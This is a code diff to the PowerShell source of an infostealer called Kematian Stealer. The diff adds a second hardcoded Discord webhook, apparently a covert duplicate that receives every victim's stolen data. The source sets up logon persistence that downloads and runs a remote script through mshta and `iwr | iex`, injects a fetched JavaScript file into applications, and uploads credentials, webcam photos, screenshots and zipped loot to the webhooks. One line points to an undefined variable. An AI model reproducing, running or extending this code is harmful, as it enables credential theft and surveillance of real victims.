@@ -1,9 +1,10 @@
 $webhook = "https://discord.com/api/webhooks/1241478437760401581/POLMzlK31aN2Zha4MYVk4TI1dhm2DJ3JHNFO1jiFjiWl4GcIPknFgrx24XN53pe9EEj1" 
+$webhook2 = "https://discord.com/api/webhooks/1240383722151219260/4q5Rr9AOj35UuuR21wg3yBgyWED_Pxmum0dhqz0vLvE2KUUGqkl-EmBAnhcYZPlUnVr4"
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $true
+$fakeerror = $false
 $persistence = $true
 $settings = $false
 
@@ -86,10 +87,10 @@ function Invoke-TASKS {
         $KDOT_DIR.attributes = "Hidden", "System"
         $task_name = "Kematian"
         if ($debug) {
-            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            $task_action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -C `"`$webhook = '$webhook2' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
         }
         else {
-            $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook2';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -816,7 +817,7 @@ Pass: $decodedPass
                         $webClient = New-Object System.Net.WebClient
                         $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
                         if ($content -ne "") {
-                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
+                            $replacedContent = $content -replace "%WEBHOOK%", $webhook2
                             $replacedContent | Set-Content -Path $file.FullName -Force
                         }
                     }
@@ -1079,23 +1080,24 @@ FileZilla: $filezilla_info
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
+    Invoke-WebRequest -Uri $webhook2 -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
     # send webcam
     $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | Out-Null
+        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook1 | Out-Null
         Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
     }
 
-    # send screenshot
-    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null
+    # Send screenshots to the second webhook
+    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$webhook2" | Out-Null
 
-    # send extracted data
+    # Send extracted data to the second webhook
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook | Out-Null
-    
-    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
+    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook2 | Out-Null
+
+    Write-Host "[!] The extracted data was sent successfully to both webhooks!" -ForegroundColor Green
     Write-Host "`r `n"
 	
     # cleanup
